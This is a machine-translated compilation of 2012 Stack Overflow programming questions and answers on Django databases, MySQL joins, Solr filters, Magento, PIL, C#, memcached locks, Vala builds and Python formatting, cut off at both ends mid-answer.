                        <input type="text" name="Email" onBlur="if(this.value==''){this.value='Email:'}" onFocus="if(this.value=='Email:'){this.value=''}" value="Email:"/>
                      </label>
                      <label>
                        <input type="text" name="Mobile Phone" />
                      </label>
                      <div class="buttons-wrapper"><a href="javascript: submitform()" class="button">Submit Info Now!</a></div>
                    </fieldset>
                  </form>
                  <script language="JavaScript" type="text/javascript"
xml:space="preserve">//<![CDATA[
//You should create the validator only after the definition of the HTML form
var frmvalidator  = new Validator("signupform");
frmvalidator.EnableMsgsTogether();
frmvalidator.addValidation("FirstName","req","Please enter your First Name");
frmvalidator.addValidation("FirstName","maxlen=20", "Max length for FirstName is 20");

frmvalidator.addValidation("Email","maxlen=50");
frmvalidator.addValidation("Email","req");
frmvalidator.addValidation("Email","email");

frmvalidator.addValidation("Mobile Phone","req");
frmvalidator.addValidation("Mobile Phone","maxlen=50");
frmvalidator.addValidation("Mobile Phone","numeric", "Please enter a valid number");

//]]></script>
                  <script type="text/javascript">
function submitform()
{
if(document.signupform.onsubmit())
{//this check triggers the validations
document.signupform.submit();
  }
 }
</script 
```

请让我知道，如果你有任何问题

# python - 第一次使用 Django 数据库 SQL 还是 NoSQL？

> ID：12078928
> 
> 赞同：3
> 
> 时间：2012-08-22T18:07:17.263
> 
> 标签：python, sql, django, nosql

我一直在通过 Udacity、Code Academy 和 Google 大学学习 Python。我现在有足够的信心开始学习 Django。我的问题是我应该在 SQL 数据库（SQLite 或 MySQL）上学习 Django；还是我应该在 Mongo 等 NoSQL 数据库上学习 Django？

我已经阅读了这两个方面的所有内容，但有很多我不明白。Mongo 听起来更好/更容易，但同时对于那些已经非常了解关系数据库并正在寻找更敏捷的东西的人来说，它听起来更好/更容易。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T18:17:17.523

作为初学者，使用`sqlite`. 您只需要为数据库提供一个位置并将 sqlite3 指定为您的后端即可使其正常工作，这很好。如果你想`postgres`稍后使用，它会做更多的工作，但它仍然是可行的。请参阅评论中的@JonathanVanasco 的注释。

如果你想最终使用 NoSQL DB，Django 目前不支持它。[这](https://docs.djangoproject.com/en/dev/ref/databases/#using-a-3rd-party-database-backend)是公认的 3rd 方 Django 后端列表。

[您可以通过称为django-nonrel](http://www.allbuttonspressed.com/projects/django-nonrel)的第三方分支使用 Mongo ，但此特定实现不支持 ManyToManyFields 并且还有一些其他限制。[您可以在此博客文章](http://www.allbuttonspressed.com/blog/django/2010/05/MongoDB-backend-for-Django-nonrel-released)中阅读更多关于 django-nonrel 中的 Mongo 的信息。[这里](https://code.djangoproject.com/wiki/NoSqlSupport)有一些关于 django-nonrel 的非官方文档。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T18:12:32.513

Postgres 是 Django 在生产中的一个很好的数据库。sqlite 开发起来很棒。您将做很多工作来尝试在您的第一个 Django 站点上不使用 RDBMS。

Django 的最大优势之一是流畅的全栈集成、出色的文档、贡献应用程序、应用程序生态系统。选择 Mongo，你会失去很多。GeoDjango 还假设 SQL 并且真的比其他人更喜欢 postgres/postgis - 而且 GeoDjango 真的很棒。

如果您想使用 Mongo，我可能会建议您从诸如瓶子、烧瓶、龙卷风、旋风或其他与全栈集成较少的东西开始，并且较少假设您使用特定的 ORM。例如，Django 教程假设您将 ORM 与 SQL DB 一起使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T18:29:34.960

`sqlite`是最简单的开始。如果您已经知道为您的第一个项目`SQL`投掷硬币以进行选择！`MySQL``Postgres`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-02-13T12:45:29.737

根据他们的 wiki，Django 不[正式支持 NoSQL 数据库](https://docs.djangoproject.com/en/1.8/faq/models/#does-django-support-nosql-databases)（恕我直言，这是一个糟糕的决定）。因此，如果您在 Django 上使用 NoSQL 路线，您需要能够轻松处理项目的非标准分支和可能没有很好记录的错误。

所以对于 Django 的初学者来说，SQL 是一个显而易见的选择。

也就是说，我在 Django 上的第一个数据库是 NoSQL 数据库，但我之前在其他平台上使用过 SQL 数据库。

# mysql - 如何在 MySQL 中使用表 A 以一对多的关系连接两个表？

> ID：12078931
> 
> 赞同：0
> 
> 时间：2012-08-22T18:07:21.337
> 
> 标签：mysql, left-join, one-to-many

我有两张桌子。

**“商店”表是一个人口统计表，具有以下字段：**

> ID、ParentID、ConsolidationType

ID 是给定商店的唯一标识符。

ParentID 可以为 NULL 或包含其父商店的 ID（如果它的 ConsolidationType 为“Secondary”）。

ConsolidationType 为 NULL、“Primary”或“Secondary”。

**“销售”表具有以下字段：**

> StoreID、SalesDate、SalesAmount

StoreID 是指 Store 表中的一个 ID。

* * *

我试图在单个查询的单行中获取给定商店的总合并销售额和单独销售额。我编写了如下 SQL 查询：

```
SELECT 
Store.ID AS 'Store ID',
SUM(IF(YEAR(main.SalesDate) = 2012 AND QUARTER(main.SalesDate) = 1,main.SalesAmount,0)) AS 'Individual Sales',
SUM(IF(YEAR(main.SalesDate) = 2012 AND QUARTER(main.SalesDate) = 1 AND YEAR(secondaries.SalesDate) = 2012 AND QUARTER(secondaries.SalesDate) = 1,main.SalesAmount + secondaries.SalesAmount,0) AS 'Consolidated Sales'
FROM Store 
LEFT JOIN Sales AS 'main' ON Store.ID = main.StoreID 
LEFT JOIN Sales AS 'secondaries' ON Store.ParentID = secondaries.StoreID 
GROUP BY Store.ID 
```

我无法弄清楚为什么这不能按预期工作。我错过了什么？我的逻辑有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:29:00.523

问题是您的查询正在生成笛卡尔积（类似）结果集。

基本上，对于来自“辅助”的每个匹配行，“主”中的一行会重复多次。

要获得您想要的结果，只需加入 sales 表一次，并匹配 StoreID 和 ParentID。

要获取`Individual Sales`，仅包含在 StoreID 匹配的 SUM 行中，如下所示：

```
SELECT Store.ID AS `Store ID`
     , SUM(IF(main.StoreID = Store.ID,
       IF(YEAR(main.SalesDate) = 2012 AND QUARTER(main.SalesDate) = 1,main.SalesAmount,0)
       ,0)) AS `Individual Sales`
     , SUM(
       IF(YEAR(main.SalesDate) = 2012 AND QUARTER(main.SalesDate) = 1,main.SalesAmount,0)
       ) AS `Consolidated Sales`
  FROM Store 
  LEFT JOIN Sales AS `main` ON main.StoreID = Store.ID OR main.StoreID = Store.ParentID
 GROUP BY Store.ID 
```

* * *

**更新**

我的错。（DOH！）`ParentID`在`Store`桌子上，而不是`Sales`桌子上。

上面的查询没有返回指定的结果。（正在处理它。）

我想你已经有了解决方案......

 ~~使用该`ParentID`列代替表中的`ID`列`Store`。如果 ParentID 列为 NULL，我们使用该`ID`列中的值。

```
SELECT IFNULL(Store.ParentID,Store.ID) AS `Store ID`
     , SUM(IF(main.StoreID = Store.ID,
       IF(YEAR(main.SalesDate) = 2012 AND QUARTER(main.SalesDate) = 1,main.SalesAmount,0)
       ,0)) AS `Individual Sales`
     , SUM(
       IF(YEAR(main.SalesDate) = 2012 AND QUARTER(main.SalesDate) = 1,main.SalesAmount,0)
       ) AS `Consolidated Sales`
  FROM Store s
  LEFT JOIN Sales AS `main` ON main.StoreID = Store.ID OR main.StoreID = Store.ParentID
 GROUP BY IFNULL(Store.ParentID,Store.ID) 
```

 ~~* * *

此查询返回指定的结果集：

```
SELECT t.StoreID AS `Store ID`
     , SUM(IF(t.source='p',
       IF(YEAR(t.SalesDate) = 2012 AND QUARTER(t.SalesDate) = 1,t.SalesAmount,0)
       ,0)) AS `Individual Sales`
     , SUM(
       IF(YEAR(t.SalesDate) = 2012 AND QUARTER(t.SalesDate) = 1,t.SalesAmount,0)
       ) AS `Consolodiated Sales`
  FROM (    
         SELECT 'p' AS source
              , a.StoreID
              , a.SalesDate
              , a.SalesAmount
           FROM Sales a
          UNION ALL
         SELECT 's' AS source
              , s.ParentID
              , b.SalesDate
              , b.SalesAmount
           FROM Sales b
           JOIN Store s ON s.ID = b.StoreID
          WHERE s.ParentID IS NOT NULL
       ) t
 GROUP BY t.StoreID
 ORDER BY t.StoreID 
```

这不是最有效的，内联视图（或“派生表”）按销售表的大小排列。将日期的谓词下推到内联视图中，或者在派生表中按月或季度汇总会更有效。

我更有可能将“季度”作为结果集的一部分返回，以允许我提取超过四分之一。

```
SELECT t.StoreID AS `Store ID`
     , t.SalesQuarter
     , SUM(IF(t.source='p',t.SalesAmount,0)) AS `Individual Sales`
     , SUM(t.SalesAmount) AS `Consolodiated Sales`
  FROM (    
         SELECT 'p' AS source
              , a.StoreID
              , ADDDATE(MAKEDATE(YEAR(a.SalesDate),1), INTERVAL FLOOR(MONTH(a.SalesDate)/4) QUARTER) AS SalesQuarter
              , SUM(a.SalesAmount) AS SalesAmount
           FROM Sales a
      --    WHERE a.SalesDate >= '2012-01-01'
      --      AND a.SalesDate < '2012-04-01'
          GROUP BY a.StoreID, SalesQuarter
          UNION ALL
         SELECT 's' AS source
              , s.ParentID
              , ADDDATE(MAKEDATE(YEAR(b.SalesDate),1), INTERVAL FLOOR(MONTH(b.SalesDate)/4) QUARTER) AS SalesQuarter
              , SUM(b.SalesAmount) AS SalesAmount
           FROM Sales b
           JOIN Store s ON s.ID = b.StoreID
          WHERE s.ParentID IS NOT NULL
      --      AND a.SalesDate >= '2012-01-01'
      --      AND a.SalesDate < '2012-04-01'
          GROUP BY s.ParentID, SalesQuarter
       ) t
 GROUP BY t.StoreID, t.SalesQuarter
 ORDER BY t.StoreID, t.SalesQuarter 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:58:22.407

我通常尝试将过滤逻辑保留在`WHERE`子句中。您的原始查询可能有太多`JOINS`，并且没有孩子的情况可能无法满足您的期望。下面的`IS NULL`检查`WHERE`允许没有孩子的商店。

```
SELECT
  s.ID
  , SUM(s.SalesAmount) AS `Individual Sales`
  , SUM(s.SalesAmount) + SUM(c.SalesAmount) AS `Consolidated Sales`
FROM Store AS s
LEFT OUTER JOIN Store AS c ON c.ParentID = s.ID
WHERE YEAR(s.SalesDate) = 2012 AND QUARTER(s.SalesDate) = 1
  AND (c.SalesDate IS NULL OR
    (YEAR(c.SalesDate) = 2012 AND QUARTER(c.SalesDate) = 1))
GROUP BY s.ID 
```~~~~

# jquery - iOS Safari 调试控制台 - 如何获取错误的行号？

> ID：12078936
> 
> 赞同：2
> 
> 时间：2012-08-22T18:07:44.613
> 
> 标签：jquery, ios, backbone.js, mobile-safari

我有一个backboneJS项目，它使用jQuery延迟对象回调加载依赖文件-该网站在台式机，经过测试的Android设备和带有iOS 5.1的iPad上加载良好-一位客户引起我的注意，该网站在她的iPad上无法运行与 iOS **4.3.5**。这是我的代码：

```
$.when(
    // Load the stuff here...
).done(
    // Call jQuery DOM ready code here...
).fail(
    function () {
        for(var i=0; i<arguments.length; i++) {
            console.log(arguments[i]);
        }
    }
); 
```

这是发送到 Safari 中的调试控制台的内容（减去`console.log`语句的行号）：

```
[object Object]
parseerror
SyntaxError: Parse error 
```

好吧，这对我一点帮助都没有——有什么想法可以在不通过 15 个主干视图和模型盲目调试的情况下查明解析错误吗？我在故障排除研究期间遗漏了任何已知的带有 Backbone 或 jQuery 延迟的旧 iOS Safari 错误？

编辑：使用以下版本 -

```
Backbone.js (unminified) 0.9.1
jQuery (unminified) 1.8.0 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T00:43:35.987

修复了问题。找到了一行代码，其中的属性名称是`class`，`myObj.class = 'foo';`并且显然`class`是旧 JS 解析器中的保留字。将其更改为`className`并且有效。

在那一点上，我仍然想知道如何在 iOS Safari 调试控制台中查看解析错误的行号。如果有人可以提供该答案，我会接受。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T19:19:00.817

Nikoshr 的想法是正确的，但更具体地说，您应该对参数中传递的对象进行字符串化。调试控制台将截断所有内容，因此只需将页面内容替换为转储即可进行调试。它不会显示任何行号，但如果出现解析错误，您可能会看到对象以某种方式搞砸了；来自 ajax 调用或其他东西的截断响应文本 - 我只提到这一点，因为你是`// Load the stuff here`如此我想你正在使用`$.getScript`或其他将返回延迟对象的东西。如果是这样，试试这个：

```
$.when(
    // Load the stuff here...
).done(
    // Call jQuery DOM ready code here...
).fail(
    function () {
        document.write(JSON.stringify(arguments[0]));
    }
); 
```

# solr - solr 过滤器是如何实际实现的？

> ID：12078938
> 
> 赞同：3
> 
> 时间：2012-08-22T18:08:17.313
> 
> 标签：solr, lucene, full-text-search, search-engine

我对查询处理的理解是否正确？

1.  **从缓存中获取 DocSet 或**第一个过滤器查询将创建 OpenBitSet 或 SortedVIntSet 的实现并缓存它
2.  **从缓存中获取 DocSet 或**所有其他过滤器创建它们的 DocBitSet 实现，它将与原始代码相交（*此代码的效率取决于 DocSet 的第一个实现的实现*）
3.  我们使用 Lucene 过滤器+查询搜索对 MainQuery 和最终 DocSet（在所有交叉点之后）进行跨越（*效率取决于第一个 DocSet 实现*）
4.  我们应用 post filters(cost > 100 && cache==false) 作为原始查询的 AND

因此，性能将取决于**第一个过滤器**，因为小型查询 SortedIntSet 更有效，而大型 BitSet 更好。我对么？

**问题的第二部分**：DocSet 有两个主要实现 - HashDocSet 和 SortedIntDoc，每个交集实现迭代第一个过滤器中的所有实例并检查它是否也在第二个 DocSet 中......这意味着我们必须按大小对过滤器进行排序，最小的优先。是否可以控制缓存过滤器的顺序（成本仅适用于非缓存过滤器）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-24T10:23:37.710

这听起来不错。有关更多信息，请查看[SolrIndexSearcher#getProcessedFilter](http://grepcode.com/file/repo1.maven.org/maven2/org.apache.solr/solr-core/4.0.0-ALPHA/org/apache/solr/search/SolrIndexSearcher.java#SolrIndexSearcher.getProcessedFilter%28org.apache.solr.search.DocSet,java.util.List%29)。

> 因此，性能将取决于第一个过滤器，因为小型查询 SortedIntSet 更有效，而大型 BitSet 更好。我对么？

这更多的是空间效率问题而不是速度问题。排序的 int[] 花费 4 * nDocs 字节，而位集花费 maxDoc / 8 字节，这就是为什么 Solr 在集合中的文档数 < maxDoc / 32 时使用排序的 int[] 的原因。

> 问题的第二部分：DocSet 有两个主要实现 - HashDocSet 和 SortedIntDoc

SortedIntDocSet 的问题是它不支持随机访问，而 HashDocSet 的问题是它不能按顺序枚举文档 ID，这对于评分很重要。这就是为什么 Solr 几乎在任何地方都使用 SortedIntDocSets 并在需要随机访问时创建一个瞬态 HashDocSet（例如，查看 JoinQParserPlugin 或 DocSlice#intersect）。

# magento - 如何在magento购物车中设置最小数量？

> ID：12078939
> 
> 赞同：1
> 
> 时间：2012-08-22T18:08:25.067
> 
> 标签：magento

我想在我的 magento 网站中设置最小数量...

Magento 配置允许我设置每个产品的最小数量.. 但我想设置每个订单的最小数量..

我的意思是我的客户可以混合他/她想要达到最低数量的任何产品..

PS：我[在 magento 论坛中找到了一个帖子，](http://www.magentocommerce.com/boards/viewthread/196666/#t308111)它解释了如何设置最小订单量.. 谁能帮我修改此代码以获得最小数量？.. 谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T19:12:37.797

有很多方法可以做到这一点，您可以转到 app\design\frontend\yourstore\2012\template\checkout\onepage\link.phtml 或您正在使用的 link.phtml。尝试删除代码并查看结帐按钮是否丢失，如果丢失，您来对地方了。所以，把这段代码（全部改变）：

```
<?php if ($this->isPossibleOnepageCheckout()):?>
    <?php if(Mage::helper('checkout/cart')->getCart()->getItemsQty() >= $minimunQuantityYouWant):?>//this code is ours
        <button type="button" title="<?php echo $this->__('Proceed to Checkout') ?>" class="button btn-proceed-checkout btn-checkout<?php if ($this->isDisabled()):?> no-checkout<?php endif; ?>"<?php if ($this->isDisabled()):?> disabled="disabled"<?php endif; ?> onclick="window.location='<?php echo $this->getCheckoutUrl() ?>';"><span><span><?php echo $this->__('Proceed to Checkout') ?></span></span></button>
    <?php else:?>//this code is ours
        Type msg here, like "You need minimum x items to finish."//this code is ours
    <?php endif;?>//this code is ours
<?php endif?> 
```

这解决了你的问题。

# python - 将图像实例（文件）转换为数组（python）

> ID：12078940
> 
> 赞同：0
> 
> 时间：2012-08-22T18:08:28.753
> 
> 标签：python, python-imaging-library, tiff

我有一个图像序列，我正在尝试在特定帧上运行脚本。我需要切换到此帧并将其转换为数组。但是，我不能，因为框架是一个实例`<TiffImagePlugin.TiffImageFile image mode=I;16 size=512x512 at 0x104A0C998>`。如何将此实例转换为数组？我已经使用了 numpy.array 并且它不起作用。谢谢！

```
prot=Image.open("F23BN.tif")
for frame in ImageSequence.Iterator(dna):
    if frame==16:
        frame.convert('L')
        print frame.mode, frame.format #I checked the format and it is still in the Instance format 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T22:47:30.127

据我了解您的问题，您正在尝试访问 tiff 图像中包含的二进制数据。正如 Dav1d 建议的那样，您可以在 PIL 中执行此操作。我在 python 2.6.5 中测试了以下内容

```
import Image
import numpy

im = Image.open('Tiff.tif')

imarray = numpy.array(im)
print imarray.shape, im.size   #these agree 
```

对于更困难的方法，您可以像打开任何其他文件一样打开该文件。在代码片段中，我假设您的文件不会太大而不能一次全部加载到内存中。

```
im = open('Tiff.tif','r')
image_data = im.read()
im.close()

#lets look at the first few characters
for char in image_data[:64]:  
    print ord(char),  #need to use ord so we can see the number 
```

使用字符串 image_data 中的数据，您可以自由地将其转换为您希望的任何其他数据类型。但是，这可能不会立即有用。首先数据是二进制的。您将需要使用 tiff 规范对其进行解密。例如，前 8 个字节是标头。

更多详细信息： [http ://partners.adobe.com/public/developer/en/tiff/TIFF6.pdf](http://partners.adobe.com/public/developer/en/tiff/TIFF6.pdf)

# c# - 如何从 ARGB 转换为十六进制 aarrggbb？

> ID：12078942
> 
> 赞同：3
> 
> 时间：2012-08-22T18:08:39.563
> 
> 标签：c#, windows-phone-7

我尝试使用此代码：

```
string ToHtml(System.Drawing.Color color)
    {
        return string.Concat("#", (color.ToArgb() & 0x00FFFFFFFF).ToString("X8"));
    } 
```

但 System.Media.Color 似乎没有 toargb() 方法。然后我尝试使用此代码：

```
string ToHtml(System.Drawing.Color color)
    {
        return ColorTranslator.ToHtml(color);//.FromHtml("#FFDFD991");
    } 
```

但是 Windows Phone 中不存在 ColorTranslator。有人能帮我吗？？？？非常感谢！！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-22T18:15:38.483

```
return string.Format("#{0:X2}{1:X2}{2:X2}{3:X2}",
                     color.A,
                     color.R,
                     color.G,
                     color.B); 
```

# python - 有没有相当于 Ruby 的官员 gem 的 Python 版本？

> ID：12078944
> 
> 赞同：3
> 
> 时间：2012-08-22T18:08:45.307
> 
> 标签：python, ruby, locking, distributed-computing

有没有相当于 Ruby 的[官员](https://github.com/chadrem/officer)gem 的 Python？它是一个分布式锁定服务器，基本上允许您在网络上而不是线程之间拥有锁。

我一直在寻找有一个 Python 库的[elock](http://dustin.github.com/elock/)，但是 elock 是未经许可的，所以我们不能真正将它用于商业软件（它也或多或少地被放弃了）。

理想情况下，等效项将适合扭曲，但这不是必需的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T15:28:13.470

我最终通过使用[memcached](http://memcached.org/)解决了这个问题，因为它具有原子更新。

解决方案相当简单：

```
import memcache

mc = memcache.Client(hosts, debug=1)

# to lock:
def request_lock(key, timeout=300):
    if mc == None:
        raise Exception("Memcache is not connected!")

    # just store a "1" in that location - this is an atomic operation so if two
    # nodes request a lock at the same time, only one of them will get a True
    return mc.add(key, "1", timeout)

# to unlock:
def request_unlock(key):
    if mc == None:
        raise Exception("Memcache is not connected!")

    return mc.delete(key) > 0 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T02:02:52.343

如果您正在做的是非对称项目，请查看[此处](http://wiki.python.org/moin/ParallelProcessing)的列表。它有一个关于使用 python 进行集群计算的部分，最有前途的两个是[celery](https://github.com/celery/celery)和[pp](http://www.parallelpython.com/)。该页面还具有用于在一台计算机上的进程之间拆分任务的资源。它也可能适用于对称项目，但我认为锁几乎必须由“服务器”拥有。

# python - 将字典的键写入文本文件

> ID：12078946
> 
> 赞同：1
> 
> 时间：2012-08-22T18:08:52.303
> 
> 标签：python, python-3.x, python-2.7

如何将字典的键逐行写入文本文件，即每行一个键？如果有任何指向相同的链接，请引导我到该链接。我可以找到将文本文件内容加载到字典中，但反之亦然。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T18:14:59.497

如果您只想打印键（即不是值），您可以简单地遍历字典：

```
with open("filename", "w") as f:
    for key in dict:
        print >>f, key 
```

或者在 Python 3 中，使用新的 print 函数：

```
with open("filename", "w") as f:
    for key in dict:
        print(key, file=f) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:11:38.730

At the bare minimum, something like this will work:

```
fp = open('filename','w');
for k,v in myDict.items():
 fp.write('%s=%s\n', k, v);
 #for writing just the key per line
 #fp.write('%s\n',k);

fp.close(); 
```

you might need sanity checks for presence of '=' in key and escaping '\r' '\n' in value with \r and \n

# c - 如何使用 C 中的 Vala 对象/方法？

> ID：12078947
> 
> 赞同：3
> 
> 时间：2012-08-22T18:08:52.313
> 
> 标签：c, vala

此时我的应用程序完全是用 C 编写的，但我想开始在 Vala 中添加对象以用于各种 C 文件。我知道我可以使用 valac 生成 .c/.h 文件并将其包含在内，但最好将它们作为源文件包含在我的 automake 设置中。

反过来，这很简单，只需为任何 .c/.h 文件编写一个 vapi 文件并将其添加为 --pkg。不幸的是，对于我想要使用的方式来说，它似乎并不那么简单。

尽管如此，我还是做了相关的补充。

配置.ac：

```
AM_PROG_VALAC([0.12.0])

dnl Only adding these to test the package include in vala
OFS_PACKAGES="--pkg gee-1.0"
AC_SUBST(OFS_PACKAGES) 
```

生成文件.am：

```
VALAFLAGS = \
    @OFS_PACKAGES@

src_ofs_SOURCES = \
    src/main.c \
    src/test.vala 
```

src/main.c

```
#include "test.h"

...

FooTest *object = foo_test_new (); 
```

src/test.vala：

```
using Gee;

namespace Foo {

    public class Test : Object {

        public Test () {
            stdout.printf ("Test construction\n");
        }
    }
} 
```

当我运行 make 我得到错误

```
src/main.c:10:18: fatal error: test.h: No such file or directory 
```

这并不奇怪，因为对 valac 的调用没有发生在对 gcc 的调用之前。所以问题真的是是否有办法告诉 automake/make 首先运行 valac 以生成需要包含的文件？

**升级版：**

使用以下更改设法使其工作：

生成文件.am：

```
VALAFLAGS = \
    -H ofs.h -C -c
    @OFS_PACKAGES@

src_ofs_SOURCES = \
    src/test.vala \
    src/main.c 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T18:33:29.690

请参阅[http://www.gnu.org/software/automake/manual/automake.html#Built-Sources-Example](http://www.gnu.org/software/automake/manual/automake.html#Built-Sources-Example)。

最简单的修复方法是添加`test.h`到 BUILT_SOURCES：

```
BUILT_SOURCES += src/test.h
CLEANFILES += $(BUILT_SOURCES) 
```

您可以通过将您的 vala 文件放在它们自己的变量中来扩展它：

```
src_ofs_VALASOURCES = $(filter %.valam,$(src_ofs_SOURCES))
BUILT_SOURCES += $(src_ofs_VALASOURCES:.vala=.h) 
```

另一种方法是将其添加`nodist_ofs_SOURCES`到`src/main.$(OBJEXT)`.

# python - '%s' % myobject: 重载

> ID：12078948
> 
> 赞同：1
> 
> 时间：2012-08-22T18:08:57.257
> 
> 标签：python, string, format

如您所知，Python 支持字符串格式化，但我想谈谈它是如何在 Python 2 中实现的。如果我们键入`a=u'абв'; b='abc'; c='%s%s'`，那么`c`变量将具有 unicode 类型，因此格式化返回 unicode 对象。我是否有可能拥有自己的类`myobject`，其中变量`c`将具有`myobject`类型？换句话说，我可以重载这个运算符吗？答案必须适用于 Python 3 和 Python 2，但用 Python 2 来描述我想要的东西更简单。谢谢！

```
class ustream(object):
  '''ustream class provides an easy access for basic operations with Unicode
  streams. The main advantage of this class is that it already has built-in
  support for regular expressions and transliteration.'''
  __slots__ = ['_stream_', 'array', 'stream']

  def __init__(self, stream='', encoding=ENCODING['default']):
    '''ustream.__init__([stream[, encoding]]) -> ustream'''
    if isinstance(encoding, bstream):
      encoding = encoding.stream
    elif isinstance(encoding, ustream):
      encoding = encoding.stream
    if isinstance(stream, bytes):
      stream = stream.decode(encoding)
    elif isinstance(stream, string):
      stream = string(stream)
    elif isinstance(stream, bstream):
      stream = stream.stream.decode(encoding)
    elif isinstance(stream, ustream):
      stream = stream.stream
    else: # if unknown type
      typename = type(stream).__name__
      raise(TypeError('stream must be bytes or string, not %s' % typename))
    self._stream_ = stream

  @property
  def array(self):
    '''unicode stream as array'''
    return([ord(char) for char in self.stream])

  @property
  def stream(self):
    '''unicode stream as string'''
    return(self._stream_)

  def __mod__(self, stream):
    '''ustream.__mod__(stream) <==> ustream % stream'''
    result = self.stream % ustream(stream).stream
    result = ustream(result)
    return(result)

  def __rmod__(self, stream):
    '''ustream.__rmod__(stream) <==> stream % ustream'''
    stream = ustream(stream)
    stream = stream.stream
    result = stream % self.stream
    result = ustream(result)
    return(result) 
```

这是我笔记本电脑的代码示例。`string`==`str`适用于 Python 3 和`unicode`Python 2。只是向后兼容。

这是我想要得到的。

```
>>> src = ustream('a stream')
>>> add = 'Hello man'
>>> result = '%s! Look here: we have %s!' % (add, src)
>>> type(result)
utstream
>>> print(result)
Hello man! Look here: we have a stream! 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:14:35.237

我不太清楚您的意思，但是您可以定义[`__mod__`](http://docs.python.org/reference/datamodel.html#object.__mod__) （或`__rmod__`）以允许类重载`%`运算符...

* * *

为了响应您的编辑，当我运行您的代码时：

```
a = stream('%s')
b = a % ('foo')
print (type(b)) #<class '__main__.stream'> 
```

它工作得很好。有什么问题？

* * *

（并且由于上面的代码再次被编辑），这是我测试的原始代码：

```
class stream(object):
  def __init__(self, data):
    if isinstance(data, unicode):
      self.data = data
    elif isinstance(data, bytes):
      self.data =data.decode('UTF-8')
    else:
      raise TypeError('invalid data')
  def __mod__(self, data):
    data = stream(data).data
    result = self.data.__mod__(data)
    result = stream(result)
    return(result) 
```

* * *

你不能得到你想要的东西的原因是因为当python去解析一个运算符（任何运算符）时，它会查看运算符左侧的对象并询问“这个对象是否为该运算符提供了合适的实现？” . 如果答案是肯定的，那么 python 调用该实现并返回结果。如果答案是否定的，它会查看操作员右侧的对象并提出相同的问题。如果答案是肯定的，它会调用正确对象的实现并返回结果。如果答案是否定的，则会引发异常。

现在在您想要的输出中，您有`"this is a string"%( obj1, streamobject )`. 但是，当 python 查看该表达式时，它会在左侧看到一个已定义的*字符串*`__mod__`，因此 python 将始终调用该方法而不是您的用户定义的方法。正如我在评论中所说，让您的对象优先的唯一方法是切换顺序（您的对象在字符串之前）。我明白你为什么不想这样做（很难以这种方式格式化多个项目）。你必须把它写成：

```
myobj % ( "this is the format string %o %d %d %d", 1, 2, 3 )  #yuck 
```

或类似的地方`%o`会以某种方式被“myobj.data”取代。最终，这变得非常混乱，我认为值得问*你为什么要这样做？*. （您可以提供一个方便的功能来真正轻松地完成所有这些工作）。

我对这个主题的最后评论是，您可能想要研究覆盖字符串格式的[模板](http://docs.python.org/library/string.html#template-strings)。它不经常使用，但可能在这里有用......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T18:10:54.993

You have to implement [`__format__`](http://www.python.org/dev/peps/pep-3101/).

# selenium - Grabbing the last number in a string

> ID：12078952
> 
> 赞同：0
> 
> 时间：2012-08-22T18:09:22.787
> 
> 标签：selenium, selenium-ide

How do I grab the last number in a stored variable or string?

For example, I stored the string "1 out of 28" to "out"

Heres what I got on Selenium so far

```
storeText   xpath=/html/body/div[3]/div[4]/div[2]/div[2]/div[2]/div/div/div[2]/div[2]/table/tbody/tr[2]/td[4]   out
storeEval   parseInt(storedVars['out'])   out1
echo   ${out1} 
```

It echoed 1\. I want to grab that number (1) and the last number (28) to compare it with something later on.

How do I grab 28 from the string?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:12:59.320

没关系，我找到了答案。

```
storeEval   '${out}'.split(' ').last()   result 
```

# c# - XSLT for-each 仅显示第一行

> ID：12078954
> 
> 赞同：2
> 
> 时间：2012-08-22T18:09:30.643
> 
> 标签：c#, xslt

再会，

我有以下 XML 文件：

```
<?xml version="1.0" encoding="utf-8" ?>
<company>
    <name>XYZ Inc.</name>
    <address1>One Abc Way</address1>
    <address2>Some avenue</address2>
    <city>Tech city</city>
    <country>Neverland</country>
    <products>
        <product id="123">Toaster</product>
        <product id="293">Oven</product>
        <product id="241">Egg Beater</product>
    </products>
</company> 
```

和以下 XSLT 文件：

```
<table>
    <xsl:for-each select="/company/products">
        <tr>
            <td>Product:</td>
            <td>
                <xsl:value-of select="product"/>
            </td>
        </tr>
    </xsl:for-each>
</table> 
```

但是当我运行以下 C# 代码时：

```
 string xmlFile = Path.Combine(xmlFolder, "Company.xml");
        string xsltFile = Path.Combine(xsltFolder, "Company.xslt");
        string htmlOutputFile = Path.Combine(templateFolder, "Company.html");

        XPathDocument myXPathDoc = new XPathDocument(xmlFile);
        XslCompiledTransform myXslTrans = new XslCompiledTransform(true);
        myXslTrans.Load(xsltFile);

        XmlTextWriter myWriter = new XmlTextWriter(htmlOutputFile, null);
        myXslTrans.Transform(myXPathDoc, null, myWriter); 
```

但是当我打开生成的 HTML 文档时，只显示第一个产品。

```
<table>
    <tr>
        <td>
            Product:
        </td>
        <td>
            Toaster
        </td>
    </tr>
</table> 
```

现在，我注意到我是否使用了“。” 而不是产品中的

```
<td><xsl:value-of select="."/> 
```

然后我得到所有三个值，但在一行上。

我错过了什么？

TIA,

科森

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T18:18:03.197

您的问题是您正在对**产品**进行 for-each （您只有一个）。你可能的意思是这样的：

```
